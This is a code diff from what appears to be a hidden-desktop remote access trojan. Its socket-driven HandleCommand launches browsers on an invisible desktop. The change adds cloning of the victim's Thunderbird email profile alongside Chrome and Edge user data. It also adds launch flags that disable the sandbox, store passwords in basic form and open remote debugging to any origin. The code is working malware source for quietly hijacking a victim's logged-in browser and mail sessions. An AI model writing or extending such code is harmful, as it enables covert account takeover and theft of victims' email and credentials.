@@ -1144,15 +1144,41 @@ static wstring get_browser_path(const wstring& browser_exe) {
     return L"";
 }
 
-static bool create_browser_clone(const wstring& browser_name, wstring& target_data_dir) {
-    wchar_t localAppData[MAX_PATH];
-    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return false;
+static wstring get_thunderbird_profile_path() {
+    wchar_t roamingPath[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roamingPath))) return L"";
+    wstring profilesPath = wstring(roamingPath) + L"\\Thunderbird\\Profiles";
+    if (!std::filesystem::exists(profilesPath)) return L"";
 
+    try {
+        for (const auto& entry : std::filesystem::directory_iterator(profilesPath)) {
+            if (entry.is_directory()) {
+                wstring name = entry.path().filename().wstring();
+                if (name.find(L".default") != wstring::npos) {
+                    return entry.path().wstring();
+                }
+            }
+        }
+        // Fallback to first directory if no .default found
+        for (const auto& entry : std::filesystem::directory_iterator(profilesPath)) {
+            if (entry.is_directory()) return entry.path().wstring();
+        }
+    } catch (...) {}
+    return L"";
+}
+
+static bool create_browser_clone(const wstring& browser_name, wstring& target_data_dir) {
     wstring source_path;
-    if (browser_name == L"chrome.exe") {
-        source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
-    } else if (browser_name == L"msedge.exe") {
-        source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+    if (browser_name == L"chrome.exe" || browser_name == L"msedge.exe") {
+        wchar_t localAppData[MAX_PATH];
+        if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return false;
+        if (browser_name == L"chrome.exe") {
+            source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+        } else {
+            source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+        }
+    } else if (browser_name == L"thunderbird.exe") {
+        source_path = get_thunderbird_profile_path();
     } else {
         return false;
     }
@@ -1205,7 +1231,12 @@ static void launch_browser_thread(wstring browser_name) {
 
     send_status("program başlatılıyor");
 
-    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=0 --disable-features=RendererCodeIntegrity";
+    wstring cmdLine;
+    if (browser_name == L"thunderbird.exe") {
+        cmdLine = L"\"" + browser_path + L"\" -profile \"" + target_data_dir + L"\" -no-remote";
+    } else {
+        cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=0 --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-notifications --remote-allow-origins=*";
+    }
     vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
     cmdVec.push_back(L'\0');
 
@@ -1302,7 +1333,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             if (!g_hHiddenDesktop) return;
 
             wstring pathStr = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            if (pathStr == L"chrome.exe" || pathStr == L"msedge.exe") {
+            if (pathStr == L"chrome.exe" || pathStr == L"msedge.exe" || pathStr == L"thunderbird.exe") {
                 thread(launch_browser_thread, pathStr).detach();
             } else {
                 vector<wchar_t> cmdLine(pathStr.begin(), pathStr.end());
